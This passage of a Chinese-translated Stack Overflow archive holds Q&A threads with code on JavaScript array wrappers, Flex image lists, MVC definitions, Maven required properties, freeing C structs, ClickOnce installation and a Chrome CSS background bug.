在这里，我们创建了一个新的包装对象（并且不向数组本身添加属性）。包装对象仍然可以访问所有数组的属性。不过，有一个小问题：

```
var foo = wrap([1,2,3]);
document.writeln(foo.length); // writes 3
foo.push(4);
document.writeln(foo.length); // writes 4 in FF, 3 in IE
foo[4] = 5;
foo[5] = 6;
document.writeln(foo.length); // still writes 4?! 
```

Using`foo[4] =`将访问我们的包装器对象和属性`4`，`5`并将在那里设置而不是在数组中 - 因此，它的长度属性不会被更新。在 IE 中，调用`push()`将无法正确更新数组...

如果您的包装对象不需要“重新路由”对数组对象的调用，还有其他使用闭包的解决方案——sktrdie 的第一个示例就是其中之一。我反对它们，因为它们也会在每次调用时创建新的函数对象。我会做什么：

```
function wrap(array) {
    if(this instanceof arguments.callee)
        this.array = array;
    else return new arguments.callee(array);
}

wrap.prototype.doSomething = function() {};
wrap.prototype.doOther = function() {}; 
```

在这里，您可以访问数组 in`doSomething()`和`doOther()`via `this.array`。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-16T21:11:37.657

只需扩展 Array 对象并将您喜欢的方法添加到您的对象。然后，您可以创建一个将数组作为参数并返回您的数组版本的桥接函数。到目前为止，这种方法更容易也更有用。

# apache-flex - 以可点击图像为成员制作水平列表

> ID：425191
> 
> 赞同：0
> 
> 时间：2009-01-08T17:40:35.290
> 
> 标签：apache-flex

我想在我的应用程序中创建一个水平列表，它将显示图像。虽然这很简单，但我希望图像打开一个弹性警报框（内置）并显示一些文本。例如，我将有一个 .NET 徽标的图像，我将在某处（如集合中）输入一些文本，该文本将显示在警报框中。

我怎么能这样做？似乎没有用于单击 flex 水平列表中的项目成员的事件处理程序？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2011-12-17T18:23:47.813

```
<?xml version="1.0" encoding="utf-8"?>
<s:Application xmlns:fx="http://ns.adobe.com/mxml/2009" 
               xmlns:s="library://ns.adobe.com/flex/spark" 
               xmlns:mx="library://ns.adobe.com/flex/mx" minWidth="955" minHeight="600" >

    <fx:Declarations>
        <s:Sine id="sineEasing"
                easeInFraction="0.3"/>
        <s:Power id="powerEasing"
                 exponent="8"/>

        <s:Animate id="anim" duration="500"  
                   effectStart="{trace('start');lock=true}"
                   effectEnd="{trace('end');lock=false}"
                   target='{viewport}' easer="{powerEasing}"  >
            <s:motionPaths>
                <s:SimpleMotionPath id="pth" property="horizontalScrollPosition"  />
            </s:motionPaths>
        </s:Animate>
        <s:ArrayCollection id="mydata3">
            <fx:String >page 1</fx:String>
            <fx:String >page 2</fx:String>
            <fx:String >page 3</fx:String>
            <fx:String >page 4</fx:String>
            <fx:String >page 5</fx:String>
            <fx:String >page 6</fx:String>
            <fx:String >page 7</fx:String>
            <fx:String >page 8</fx:String>
            <fx:String >page 9</fx:String>
            <fx:String >page 10</fx:String>
            <fx:String >page 11</fx:String>
            <fx:String >page 12</fx:String>
            <fx:String >page 13</fx:String>
            <fx:String >page 14</fx:String>

        </s:ArrayCollection>
    </fx:Declarations>

    <fx:Script>
        <![CDATA[
            import mx.controls.Alert;
            import mx.events.DragEvent;
            import mx.events.FlexEvent;

            import spark.events.IndexChangeEvent;

            private const FUDGE_FACTOR:Number = 0.5;

            [Bindable] private var lock:Boolean= false;

            [Bindable] private var viewport ;
            [Bindable] private var max:int;
            [Bindable]protected var lstData:ArrayCollection = new ArrayCollection([
                {label:"mmm",source:"images/DSC_0002.JPG"},
                {label:"nxt",source:"images/DSC_0003.JPG"},
                {label:"nxt3",source:"images/DSC_0008.JPG"},
                {label:"nxt3",source:"images/DSC_0009.JPG"},
                {label:"nxt3",source:"images/DSC_0010.JPG"},
                {label:"mmm",source:"images/DSC_00011.JPG"},
                {label:"mmm",source:"images/DSC_0011.JPG"},
                {label:"nxt3",source:"images/DSC_0012.JPG"},
                {label:"mmm",source:"images/DSC_0013.JPG"},
                {label:"nxt3",source:"images/DSC_0014.JPG"},
                {label:"mmm",source:"images/DSC_0015.JPG"},
                {label:"mmm",source:"images/DSC_0016.JPG"},
                ]);
            private function fudgeMouseWheel( event:MouseEvent ):void
            {
                trace('list.scroller.horizontalScrollBar.value'+list.scroller.horizontalScrollBar.value);
                event.delta *= FUDGE_FACTOR;    
                if( event.delta >0){
                    //list.scroller.viewport.horizontalScrollPosition+=250;
                    if(!lock)  next();
                }else{
                    //list.scroller.viewport.horizontalScrollPosition-=250;
                    if(!lock)  prev();
                }
                //trace('delta'+event.delta);
            } 

            protected function list1_creationCompleteHandler(event:FlexEvent):void
            {
                this.viewport = list.scroller.viewport;
                list.scroller.horizontalScrollBar.addEventListener(Event.CHANGE, drag_handler);
                this.addEventListener( MouseEvent.MOUSE_WHEEL, fudgeMouseWheel, true );
                trace('list.scroller.viewport.contentWidth '+list.scroller.viewport.contentWidth );
                max=list.scroller.viewport.contentWidth-250;
                trace('max: '+ max);

            }
            private function drag_handler(e):void
            {
                trace('drag:'+list.scroller.horizontalScrollBar.value);
            }

            [Bindable] private var currentPos:int;

            protected function next():void
            {
                currentPos = list.scroller.viewport.horizontalScrollPosition;
                pth.valueTo = currentPos+250;
                pth.valueFrom = currentPos;
                anim.play();
                scrollbar.value += 250;
                tempSliderPos += 250;
            }

            private function prev():void
            {
                currentPos = list.scroller.viewport.horizontalScrollPosition;
                pth.valueTo = currentPos-250;
                pth.valueFrom = currentPos;
                anim.play();    
                scrollbar.value -= 250;
                tempSliderPos -= 250;
            }

            private var tempSliderPos:int=0;

            private function change( e ):void
            {
                //trace('e.target.value');
                /* if( e.target.value > tempSliderPos  )
                {
                pth.valueTo = tempSliderPos+250;
                pth.valueFrom = tempSliderPos;
                anim.play();    
                tempSliderPos+=250;

                }else{
                pth.valueTo = tempSliderPos-250;
                pth.valueFrom = tempSliderPos;
                anim.play();    
                tempSliderPos-=250;

                }  */

                /*  if( e.target.value > tempSliderPos  )
                {

                //if(!lock) next();
                pth.valueTo = tempSliderPos+250;
                pth.valueFrom = tempSliderPos;
                anim.play();    

                tempSliderPos+=250;

                }else{
                //if(!lock) prev();
                pth.valueTo = tempSliderPos-250;
                pth.valueFrom = tempSliderPos;
                anim.play();    
                tempSliderPos-=250;

                }*/

                //trace(e.target.value);
            }

            protected function scrollbar_changeStartHandler(event:FlexEvent):void
            {
                //trace('start')
            }

            protected function scrollbar_changeEndHandler(e:Event):void
            {
                Event as FlexEvent;
                if( e.target.value > tempSliderPos  )
                {
                    trace('tempSliderPos '+tempSliderPos+' e.target.value '+e.target.value)
                    //if(!lock) next();
                    pth.valueTo = e.target.value;
                    pth.valueFrom = tempSliderPos;
                    anim.play();    

                    tempSliderPos = e.target.value;

                }else{
                    trace('tempSliderPos '+tempSliderPos+' e.target.value '+e.target.value)
                    //if(!lock) prev();
                    pth.valueTo = e.target.value;
                    pth.valueFrom = tempSliderPos;
                    anim.play();    
                    tempSliderPos = e.target.value;

                }
            }

        ]]>
    </fx:Script>

    <!--<mx:HorizontalList id='list' 
                       width="250" height="281" 
                                dataProvider='{lstData}'
                                itemRenderer="list_item" 
                                x="216" y="48" 
                                creationComplete="list1_creationCompleteHandler(event)">
        </mx:HorizontalList>-->

    <s:List id='list' skinClass="ListSkin" width="250" height="281" 
            dataProvider='{lstData}'
            itemRenderer="list_item" x="216" y="48" creationComplete="list1_creationCompleteHandler(event)">

    </s:List> 

    <s:HScrollBar id='scrollbar'   changeStart="scrollbar_changeStartHandler(event)"
                  changeEnd="scrollbar_changeEndHandler(event)"
                  stepSize="250"

                  width="250" minimum="0" maximum="{max}" x="216" y="382" change="{change(event)}" 
    snapInterval="250" />

</s:Application> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T17:55:46.943

只需向图像添加事件处理程序

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T22:58:32.277

如果您询问如何捕获列表中项目的选择，您可以使用许多事件：itemClick、itemDoubleClick、更改：

```
<?xml version="1.0" encoding="utf-8"?>
<mx:Application xmlns:mx="http://www.adobe.com/2006/mxml" layout="absolute" initialize="this_initialize()" creationComplete="this_creationComplete()">

    <mx:Script>
        <![CDATA[
            import mx.controls.Alert;
            import mx.events.ListEvent;
            import mx.collections.ArrayCollection;

            [Bindable]
            private var images:Array;

            private function this_initialize():void
            {
                images = new Array();
                images.push("myimage1.jpg");
                images.push("myimage2.jpg");
                images.push("myimage3.jpg");
                images.push("myimage4.jpg");
                images.push("myimage5.jpg");
            }

            private function this_creationComplete():void
            {

            }

            private function list_itemClick(event:ListEvent):void
            {
                Alert.show(event.currentTarget.selectedItem as String);
            }

        ]]>
    </mx:Script>

    <mx:HorizontalList id="list" dataProvider="{images}" itemClick="list_itemClick(event)">
        <mx:itemRenderer>
            <mx:Component>
                <mx:Image source="{data}" />
            </mx:Component>
        </mx:itemRenderer>
    </mx:HorizontalList>

</mx:Application> 
```

你问的是这个吗？您只需要挂钩到列表事件之一（有关更多信息，请参阅 Flex 文档）来检索选择了哪个项目。有道理？

# model-view-controller - MVC 的最佳定义是什么？

> ID：425197
> 
> 赞同：11
> 
> 时间：2009-01-08T17:41:46.613
> 
> 标签：model-view-controller, design-patterns

我一直在使用带有 MVC 配置的 Zend 框架，阅读了有关 Ruby on Rails 的信息，并且我计划在 Python（Django？）中探索其他 MVC 框架。我真的很喜欢它隔离逻辑、安全性和验证的某些部分的方式。但是在使用它仅仅一年之后，我[在这里](https://stackoverflow.com/questions/423823/whats-your-favorite-programmer-ignorance-pet-peeve#423847)阅读了一个答案，说几乎每个人都对 MVC 有错误的定义，这让我想知道：什么是 MVC 的正确定义，我在哪里可以阅读有关模式和标准实现的信息？

**更新：**我知道我们都知道 BASIC 定义（有一个模型、一个控制器和一个视图，控制器上的操作在使用模型制作某些内容后会转到带有一些信息的视图）但我很想知道你的定义是什么认为每个人都知道以及为什么是错的（也许这会向每个人解释可能存在错误、意见的地方，当然还有你对此的真正观点）

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2009-01-08T17:56:17.223

我发现人们对 MVC 的理解最大的错误是他们认为该模式包含的内容比它所包含的更多。更具体地说，人们经常认为：

*   模型 = 数据库
*   视图 = HTML
*   控制器 = 业务逻辑和其他一切。

这通常是在较小的应用程序中工作的方式，但实际上 MVC 是一种将业务代码与表示代码分离的方式。该模型完成所有真正的业务工作。视图提供外观和感觉，控制器将一个映射到另一个。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2009-01-08T17:52:17.000

请参阅 Martin Fowler 所著的《企业应用程序架构模式》一书的第 14 章。

关于 MVC 的部分从以下内容开始：

> “模型视图控制器 (MVC) 是引用最多（也是错误引用最多）的模式之一。它最初是由 Trygve Reenskaug 在 1970 年代后期为 Smalltalk 平台开发的框架。从那时起，它在大多数 UI 中发挥了重要作用框架和对 UI 设计的思考。”

它还说：

> “当我想到 MVC 时，我看到了两个主要的分离：将表示与模型分离，以及将控制器与视图分离。
> 
> ...
> 
> 其中，表示和模型的分离是软件中最重要的设计原则之一，唯一不应该遵循它的情况是在模型没有实际行为的非常简单的系统中。一旦你得到一些非视觉逻辑，你应该应用分离。不幸的是，许多 UI 框架使它变得困难，而那些不这样做的框架通常是在没有分离的情况下教授的。
> 
> 视图和控制器的分离不太重要，所以我只建议在真正有用时才这样做。对于富客户端系统，这种情况几乎不会发生，尽管这在控制器分离的 Web 前端很常见。这里的大多数网页设计模式都是基于这个原则。”

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-01-08T17:54:02.783

我相信Martin Fowler[在这里](http://martinfowler.com/eaaDev/uiArchs.html)给出的 MVC 定义。但是，您可能想注意到这些框架或多或少都有自己的调整。例如，像 Django 这样的框架由于其模板特性而更像是模型-模板-控制器。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-08T17:45:37.947

我相信同样的事情。就我而言，任何能够将显示、数据/业务对象和它们的控制（初始化、响应用户输入）的关注点分开的东西都会获得 MVC 寻求提供的好处。

目的是将这些项目移动到可重用的组件中，并能够交换不同的实现，还能够单独测试各个部分。IMO 这就是 MVC 的全部意义所在。

[这](http://ctrl-shift-b.blogspot.com/2007/08/interactive-application-architecture.html)是对 MVC 范式的一些历史和流行实现的很好的记录。我们也应该在其中添加为 WPF 推荐的[Model - View - ViewModel模式。](http://blogs.msdn.com/dancre/archive/2006/07/23/676272.aspx)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2016-11-03T09:29:01.527

模型-视图-控制器模式提出了软件开发中使用的三个主要组件或对象：

*   模型，它表示软件应用程序中数据的底层逻辑结构以及与之关联的高级类。此对象模型不包含有关用户界面的任何信息。
*   一个 View ，它是代表用户界面中元素的类的集合（用户可以在屏幕上看到和响应的所有东西，例如按钮、显示框等）
*   一个 Controller ，代表连接模型和视图的类，用于模型和视图中的类之间进行通信。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2015-08-11T05:46:23.240

MVC 是三种 ASP.NET 编程模型之一。MVC 是使用 MVC（模型视图控制器）设计构建 Web 应用程序的框架：模型代表应用程序核心（例如数据库记录列表）。视图显示数据（数据库记录）。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2018-04-13T14:41:58.270

该项目分为三个部分：

1.  模型：表示到数据库中。
2.  视图：表示到您的项目界面中，您可以使用 html、javaScript 和 css 来实现。
3.  控制器：这是您在函数中表示的业务逻辑，它也是代表安全级别的模型和视图之间的链接。

# maven-2 - 我可以强制 Maven 2 要求在命令行上指定属性吗？

> ID：425198
> 
> 赞同：19
> 
> 时间：2009-01-08T17:42:28.407
> 
> 标签：maven-2

我正在设置一个 Maven 构建，并且需要在命令行上将目标服务器指定为属性（然后用于选择适当的配置文件），例如

```
mvn -Denv=test 
```

如果未设置属性，我希望构建失败 - 这可能吗？

是的，我是 Maven 新手。

**编辑：**我看过[这个链接](http://docs.codehaus.org/display/MAVENUSER/Required+Declaration+of+Properties)，这似乎暗示这是不可能的，但我不确定它是最新的。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2009-04-10T23:47:14.117

每个人都很亲密，但是在执行器中有一条规则可以专门检查属性，不需要蚂蚁或时髦的配置文件：[http ://maven.apache.org/enforcer/enforcer-rules/requireProperty.html](http://maven.apache.org/enforcer/enforcer-rules/requireProperty.html)

该规则还可以检查属性的值。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-01-12T00:20:21.073

也许您可以使用这样的解决方法：在 Maven 中，如果未设置某些属性，您可以激活配置文件：

```
<project>
...
    <profiles>
        <profile>
            <id>failure_profile</id>
            <activation>
                <property>
                    <name>!env</name>
                </property>
            </activation>
        </profile>
    </profiles>
</project> 
```

然后你应该强制这个配置文件总是失败，例如使用*maven-enforcer-plugin*：

```
<profile>
    <id>failure_profile</id>
    ...
    <build>
        <plugins>
          <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-enforcer-plugin</artifactId>
            <executions>
              <execution>
                <id>enforce</id>
                <goals>
                  <goal>enforce</goal>
                </goals>
                <configuration>
                  <rules>
                    <AlwaysFail/>
                  </rules>
                  <fail>true</fail>
                </configuration>
              </execution>
            </executions>
          </plugin>
        </plugins>
      </build>
</profile> 
```

如果您不提供 -Denv build 将失败：

```
[INFO] [enforcer:enforce {execution: enforce}]
[WARNING] Rule 0: org.apache.maven.plugins.enforcer.AlwaysFail failed with message:
Always fails!
[INFO] ---------------------------------------------------------
[ERROR] BUILD ERROR 
```

好吧，它比 Ant 更冗长，但纯粹是 Maven :)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-08T21:12:36.547

我的第一个倾向是创建一个在 env 属性未设置时处于活动状态的配置文件，并让它以某种方式失败。也许您可以编写一个 Maven 插件来测试该属性并在它不存在时失败？

或者，您可以使用非常小的 ant-build 脚本对其进行测试。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-09T15:43:39.293

详细说明 edbrannin 的替代解决方案：

```
<project>
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.yourcompany</groupId>
  <artifactId>yourproject</artifactId>
  <version>1.0-SNAPSHOT</version>
  <build>
    <plugins>
      <plugin>
        <artifactId>maven-antrun-plugin</artifactId>
        <executions>
          <execution>
            <id>checkParam</id>
            <phase>initialize</phase>
            <goals><goal>run</goal></goals>
            <configuration>
              <tasks>
                <fail message="'env' property must be set" unless="env"/>
              </tasks>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project> 
```

将为您提供以下输出：

```
[INFO] ------------------------------------------------------------------------
[ERROR] BUILD ERROR
[INFO] ------------------------------------------------------------------------
[INFO] An Ant BuildException has occured: 'env' property must be set 
```

恕我直言，这是最直接的方法（我个人会选择的方法）。

您甚至可以使用嵌套`<condition>`的包含`<or>`和`<equals>`标签来控制一组允许的值（请参阅 Ant 手册：[http](http://ant.apache.org/manual/Tasks/conditions.html) ://ant.apache.org/manual/Tasks/conditions.html ）

# c - 如何释放 C 结构？

> ID：425205
> 
> 赞同：4
> 
> 时间：2009-01-08T17:45:21.070
> 
> 标签：c, objective-c, struct, malloc

给定一个结构，例如

```
typedef struct
{
  int value;
} TestStruct; 
```

为什么下面的代码（在 iPhone 上运行的 Objective-C 类的上下文中）会抛出“非对齐指针被释放”异常？

```
TestStruct ts = {33};
free(&ts); 
```

注意我的超级目标是使用具有许多向量数学函数的 C 库，因此需要找到一些可行的方法来混合 C 和 Objective-C

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2009-01-08T17:48:48.627

在我看来，您正在尝试释放堆栈或静态变量。你需要有 malloc()'d 的东西才能让它成为 free()'d。

试试这个：

```
TestStruct *ts = malloc(sizeof(TestStruct));
ts->value = 33;
free(ts); 
```

对于那些更熟悉面向对象语言的人，您可能会发现创建构造函数很有帮助：

```
TestStruct *newTestStruct(int value)
{
    TestStruct *ret = malloc(sizeof(TestStruct));
    ret->value = value;
    return ret;
} 
```

这使您可以一步分配结构并设置值。请记住，一旦不再有用，就应该释放该值：

```
TestStruct *x = newTestStruct(3);
free(x); 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-01-08T17:47:53.233

因为你试图释放分配在堆栈上的东西。函数 free() 只能在使用 malloc() 分配的内存上调用。

# visual-studio-2008 - 如何安装/部署/构建我的 Visual C# 应用程序以供所有用户使用？

> ID：425207
> 
> 赞同：2
> 
> 时间：2009-01-08T17:45:47.433
> 
> 标签：visual-studio-2008, deployment, windows-xp, installation, clickonce

我用 Microsoft Visual C# 2008 Express Edition 编写了一个应用程序。

我要安装它的 Windows XP 计算机有两个用户帐户。一个是管理员帐户，另一个是主用户帐户，没有管理员权限。

我尝试以主用户身份安装该应用程序，但出现错误说我不能，因为我不是管理员。美好的。我尝试将应用程序安装为管理员帐户。它可以在管理员帐户下正常安装和工作，但在我的主用户帐户中似乎不可用。从主用户帐户，我使用 Windows 资源管理器导航到我以管理员身份运行应用程序的位置，并且出现相同的“无法安装”错误。

我需要做什么才能使我的主用户帐户可以使用它？

谢谢！

-阿迪娜

更新：有人询问这些细节：我正在使用“ClickOnce”发布方案（我认为这是 Express 中唯一可用的东西。我使用向导并将其发布到我机器上的本地文件夹，然后我说“用户的将从 CD-ROM 安装”（而不是从网站或文件共享），然后选择“应用程序将不检查更新”

update2：当我尝试在主用户帐户下安装时，我得到一个对话框，上面写着：“应用程序无法启动。请联系应用程序供应商。” 然后有一个“详细信息...”按钮，我单击它并获得以下错误摘要： 错误摘要 下面是错误摘要，这些错误的详细信息在日志中稍后列出。* C:\ADIA\ADIA.application 的激活导致异常。检测到以下失败消息： + 访问被拒绝。（来自 HRESULT 的异常：0x80070005 (E_ACCESSDENIED)）

另一个注意事项......这是一个非常简单的应用程序。如果我将在 MS Visual Express 中工作时生成的可执行文件复制到另一台机器并以我的主要用户身份运行，它运行良好。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-08T18:40:11.817

您不能更改 ClickOnce 安装项目以安装所有用户。它们旨在仅为个人用户安装。您需要创建一个 MSI 安装程序。将新项目添加到您的解决方案中，转到其他项目类型 | 设置和部署 | 安装向导。那应该让你上路，然后看看我的另一个答案。

不确定这是否适用于 Express。如果没有，您可能需要使用第三方安装程序，例如[Wix](http://wix.sourceforge.net/)或[Nullsoft 安装程序](http://nsis.sourceforge.net/Main_Page)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-08T17:58:59.123

在 Visual Studio 中打开您的安装项目。单击您的部署项目，然后按 F4 以显示属性。在属性中，将**InstallAllUsers**切换为 true 并重建您的项目。它现在应该可以按您的预期工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T17:54:30.817

安装的是 MSI 吗？如果是这样，请尝试 MSIEXEC.EXE /I yourpackage.msi ALLUSERS=1

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-08T20:03:10.837

如果您的应用程序是单个 .exe 文件，为什么还要安装？我喜欢可以复制到我的机器并运行而无需安装和卸载的应用程序。

如果您想要真正花哨，请使用 .cmd 文件压缩您的 .exe 文件，该文件将 .exe 复制到“程序文件”并创建一个开始菜单快捷方式。

ClickOnce 的最大优势在于适用于频繁更改的应用程序。它允许客户端从更新的服务器版本无缝更新自己。如果您不这样做，那么使用 ClickOnce 的主要好处就没有了。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-08T18:02:38.490

MDSN[博客](http://blogs.msdn.com/gauravb/archive/2008/10/02/clickonce-fails-with-hresult-0x80070005-e-accessdenied.aspx)上的一篇博文解释说，非管理员用户需要目录和注册表项的权限，并提供了一个可怕的解决方法。

# css - 背景颜色和谷歌浏览器的问题

> ID：425216
> 
> 赞同：45
> 
> 时间：2009-01-08T17:49:19.687
> 
> 标签：css, google-chrome

有时我会在 Chrome 中获得破碎的背景。使用任何其他浏览器都不会出现此错误。

这是负责 body 的背景颜色的简单 CSS 行：

```
body 
{
   background: black;
   color: white;
   font-family: Chaparral Pro, lucida grande, verdana, sans-serif;
} 
```

这正是我遇到这个问题的方式。我单击了 Gmail 电子邮件中包含的链接，但出现了错误（无背景）。然后我刷新页面，背景完全着色。

如何解决这个问题？

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2009-01-08T20:19:31.757

从来没有听说过。尝试：

```
html, body {
  width: 100%;
  height: 100%;
  background-color: #000;
  color: #fff;
  font-family: ...;
} 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-01-20T00:05:09.390

好的，伙计们，我找到了**解决方案**，. 这不是很好，但没有副作用。

**的HTML：**

```
<span id="chromeFix"></span> 
```

（把它放在body标签下面）

**CSS：**

```
#chromeFix { display: block; position: absolute; width: 1px; height: 100%; top: 0px; left: 0px; } 
```

**这可以解决问题：**

它迫使 Chrome 认为页面的内容不是 100%，这会阻止正文“显示”内容的大小并解决缺少的背景错误。这基本上是`height: 100%`在应用于 body 或 html 时执行的操作，但是您不会像在这些元素上使用 100% 高度那样在滚动时（超过 100% 页面高度）获得背景被切断的副作用。

我现在可以睡觉了=]

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2010-05-03T12:32:45.197

我在几个网站上遇到了同样的问题，并通过将背景样式从 body 移动到 html 来修复它（我猜这是已经提到的`body {}`to`html, body{}`技术的变体，但表明你可以只使用 html 上的样式），例如

```
body {
   background-color:#000000;
   background-image:url('images/bg.png');
   background-repeat:repeat-x;
   font-family:Arial,Helvetica,sans-serif;
   font-size:85%;
   color:#cccccc;

} 
```

变成

```
html {
   background-color:#000000;
   background-image:url('images/bg.png');
   background-repeat:repeat-x;
}
body {
   font-family:Arial,Helvetica,sans-serif;
   font-size:85%;
   color:#cccccc;
} 
```

这适用于 IE6-8、Chrome 4-5、Safari 4、Opera 10 和 Firefox 3.x，没有明显的不良副作用。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-01-16T14:01:15.780

我能够解决这个问题：

```
html { height: 100%; } 
```

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2009-04-17T20:58:00.797

HTML 和 body height 100% 在旧 IE 版本中不起作用。

您必须将背景属性从 body 元素移动到 html 元素。
这将修复它跨浏览器。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2010-08-04T09:54:14.023

简单、正确的解决方案 - 在 html 中定义背景图像和颜色，而不是正文。除非您在正文中定义了特定高度（不是百分比），否则将假定其高度与容纳所有内容所需的高度一样高。所以你的背景样式应该进入 html，这是整个 html 文档，而不仅仅是正文。简单的。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2010-09-07T01:40:18.833

在这里尝试了所有其他解决方案都没有成功后，我怀疑地尝试了[本文](http://www.thescube.com/blog/chrome-background-colour-image-not-showing/)中找到的解决方案，并让它工作。

从本质上讲，它归结为`@charset "utf-8";`从您的 CSS 中删除。

这在 DreamWeaver 中似乎是一个糟糕的实现——但无论如何，它确实为我解决了这个问题。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-01-08T20:16:08.953

我不确定 100%，但尝试用“html，body”替换选择器：

```
html, body 
{
   background: black;
   color: white;
   font-family: Chaparral Pro, lucida grande, verdana, sans-serif;
} 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-01-10T09:31:30.747

我会尝试 Logan 和 1mdm 的建议，调整 CSS，但我真的会等待新的 Chrome 版本出现修复错误，然后才会长出白发。

恕我直言，当前的 Chrome 版本仍然是 alpha 版本，并且已经发布，以便它可以在开发过程中传播。我个人遇到了表格宽度的问题，我的代码在每个浏览器中都能正常运行，但无法在 Chrome 中运行。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-10-12T11:57:47.503

Google Chrome 和 safari 需要针对正文和背景问题进行调整。我们使用了如下所述的附加标识符。

```
<style>
body { background:#204960 url(../images/example.gif) repeat-x top; margin:0; padding:0; font-family:Tahoma; font-size:12px; }

#body{ background:#204960 url(../images/example.gif) repeat-x top; margin:0; padding:0; font-family:Tahoma; font-size:12px;}
</style>    
<body id="body"> 
```

使用 body 和 #body 标识符并在两者中输入相同的样式。使用body的id属性制作body标签。

这对我有用。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2010-06-24T15:45:51.357

Adam 的**chromeFix**解决方案和 Paul Alexander 的**纯 CSS**修改解决了**Chrome**中的问题，但没有解决**Safari**中的问题。一些额外的调整也解决了 Safari 中的问题：`width: 100%`和`z-index:-1`（或一些其他适当的负值，将这个元素放在页面上所有其他元素的后面）。

CSS：

```
body:after {display:block; position:absolute; width:100%; height:100%; top:0px; left:0px; z-index:-1; content: "";} 
```

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2010-08-26T07:48:32.647

我在 Chrome 和 Safari aka Webkit 浏览器中都有同样的事情。我怀疑这不是一个错误，而是错误使用 css 会“破坏”背景。

在上面的问题中，body 背景属性设置为：

```
background: black; 
```

这很好，但并不完全正确。没有图像背景，因此...

```
background-color: black; 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2009-01-08T20:18:42.490

我也看到了 Chrome 的这个问题，如果我没记错的话，如果你最小化然后最大化你的窗口，它也会修复它吗？

自从 Chrome 发布以来并没有真正使用过太多，但这绝对是我责怪谷歌的原因，因为我检查它的代码是密封的。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2009-01-10T12:10:13.217

每个人都说你的代码很好，你知道它可以在其他浏览器上正常工作。**所以是时候放弃科学，尝试一些东西了**：）

尝试将背景颜色放在 body 标签本身而不是/as-well-as 在 CSS 中。也许在 Javascript 中再次（重复地）坚持。在某些时候，Chrome 必须每次都按照您的需要放置背景。可能是时间解释问题...

[如果其中任何一项工作，当然，您可以在服务器端切换它，这样有趣的代码只会显示在 Chrome 中。几个月后，当 Chrome 发生变化并且问题消失时......好吧，以后再担心。]

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2009-01-30T17:11:55.663

奇怪的是，它实际上并没有发生在每个页面上，即使刷新它也似乎并不总是有效。

我的解决方案也是添加`{height: 100%;}`。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2009-03-04T04:23:40.040

如果您仍然遇到问题，您可以尝试在上面的 chromeFix 中将 'top' 切换为 'bottom'，还有一个 div 而不是 span

```
<div id="chromeFix"></div> 
```

风格：

```
#chromeFix { display: block; position: absolute; width: 1px; height: 100%; bottom: 0px; left: 0px; } 
```

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2009-09-22T15:03:30.407

我使用的级联样式表：

```
body {background-color: #FAF0E6; font-family: arial, sans-serif } 
```

它在 Internet Explorer 中工作，但在 Firefox 和 Chrome 中失败。我将其更改为：

```
body {background: #FAF0E6; font-family: arial, sans-serif } 
```

（即我删除了`-color`。）

它适用于所有三种浏览器。（我不得不重新启动 Chrome。）

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2009-11-02T18:07:35.493

> 当您使用 Dreamweaver 为网页设计创建 CSS 样式时，Dreamweaver 会添加一个默认代码，例如
> 
> ```
> @charset “utf-8″; 
> ```
> 
> 尝试从样式表中删除它，背景图像或颜色应该正确显示

[来源](http://www.thescube.com/chrome-background-colour-image-not-showing/)

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2009-12-16T18:57:14.593

它一定是[WebKit](http://en.wikipedia.org/wiki/WebKit)问题，因为它在 Safari 4 和 Chrome 中都存在。

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2010-04-07T11:30:43.590

```
body, html { 
   width: 100%;
   height: 100%;
} 
```

为我工作:)

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2010-08-04T13:17:59.293

我很确定这是 Chrome 中的一个错误。如果您将浏览器大小调整为全屏，然后切换选项卡，很可能会发生这种情况。有时，如果您只是切换标签/打开一个新标签。很高兴听到您找到了“修复”。

* * *

## 回答 #22

> 赞同：0
> 
> 时间：2012-07-04T21:52:26.877

这是我最终解决问题的方法：

这是实际的问题，显然 CSS 中定义的 body 标签没有被拾取。

![正文标签在 Chrome/Safari 中不起作用](https://i.stack.imgur.com/63Yil.png)

